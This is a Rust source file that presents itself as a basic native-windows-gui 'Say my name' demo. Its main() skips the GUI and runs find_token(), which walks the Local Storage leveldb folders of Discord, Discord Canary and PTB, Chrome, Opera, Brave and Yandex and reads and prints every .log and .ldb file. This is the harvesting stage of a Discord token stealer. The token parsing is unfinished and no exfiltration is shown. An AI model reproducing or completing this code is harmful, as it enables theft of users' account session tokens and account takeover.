extern crate native_windows_gui as nwg;
extern crate native_windows_derive as nwd;

use nwd::NwgUi;
use nwg::NativeUi;
use std::env;
use std::ffi::OsString;
use std::path::Path;
use std::fs;
use std::fs::File;
use std::io::{self, prelude::*, BufReader};


#[derive(Default, NwgUi)]
pub struct BasicApp {
    #[nwg_control(size: (300, 115), position: (300, 300), title: "Basic example", flags: "WINDOW|VISIBLE")]
    #[nwg_events(OnWindowClose: [BasicApp::say_goodbye])]
    window: nwg::Window,

    #[nwg_layout(parent: window, spacing: 1)]
    grid: nwg::GridLayout,

    #[nwg_control(text: "Heisenberg", focus: true)]
    #[nwg_layout_item(layout: grid, row: 0, col: 0)]
    name_edit: nwg::TextInput,

    #[nwg_control(text: "Say my name")]
    #[nwg_layout_item(layout: grid, col: 0, row: 1, row_span: 2)]
    #[nwg_events(OnButtonClick: [BasicApp::say_hello])]
    hello_button: nwg::Button,
}

impl BasicApp {
    fn say_hello(&self) {
        nwg::modal_info_message(&self.window, "Hello", &format!("Hello {}", self.name_edit.text()));
    }

    fn say_goodbye(&self) {
        nwg::modal_info_message(&self.window, "Goodbye", &format!("Goodbye {}", self.name_edit.text()));
        nwg::stop_thread_dispatch();
    }
}

fn main() {
    // nwg::init().expect("Failed to init Native Windows GUI");
    // nwg::Font::set_global_family("Segoe UI").expect("Failed to set default font");
    // let _app = BasicApp::build_ui(Default::default()).expect("Failed to build UI");
    // nwg::dispatch_thread_events();


    // Prints out all the tokens we found
    println!("{:?}", find_token())
}


// Finds all tokens and returns a list of tokens
fn find_token() -> Vec<String> {
    // Get the local and appdata files
    let local_path = env::var_os("LOCALAPPDATA").unwrap();
    let roaming_path = env::var_os("APPDATA").unwrap();

    // All paths for discord tokens, initialized into vector
    let paths: Vec<String> = vec![
        format!("{}\\Discord\\Local Storage\\leveldb", roaming_path.to_str().unwrap()),
        format!("{}\\discordcanary\\Local Storage\\leveldb", roaming_path.to_str().unwrap()),
        format!("{}\\discordptb\\Local Storage\\leveldb", roaming_path.to_str().unwrap()),
        format!("{}\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb", local_path.to_str().unwrap()),
        format!("{}\\Opera Software\\Opera Stable\\Local Storage\\leveldb", roaming_path.to_str().unwrap()),
        format!("{}\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb", local_path.to_str().unwrap()),
        format!("{}\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb", local_path.to_str().unwrap()),
    ];

    // Initialize a new vector of strings
    let tokens: Vec<String> = Vec::new();


    // Go through all paths
    for path in paths.into_iter() {
        // Create a path object with the string path
        let new_path = Path::new(&path);

        // If it doesn't exist, skip it
        if !&new_path.exists() {
            continue;
        }

        // Get all files in the directory
        let paths = fs::read_dir(new_path).unwrap();

        // Iterate through all files in the path
        for path in paths {
            // Weird unwrapping thing because i'm new to rust
            let unwrapped = path.as_ref().unwrap().path();
            let string = unwrapped.to_str().unwrap();


            // If the file is not a .log or .ldb we don't care about it
            if !(string.ends_with(".log") || string.ends_with(".ldb")) {
                continue
            }

            println!("{}", string);

            // Open the file we have
            let file = File::open(unwrapped);
            // Make a new reader for the file
            let reader = BufReader::new(file.unwrap());
            // Read the file line by line
            for line in reader.lines() {
                println!("{}", line.unwrap_or(String::from("Err")));
            }
        }
    }

    // Return list of tokens
    return tokens;
}
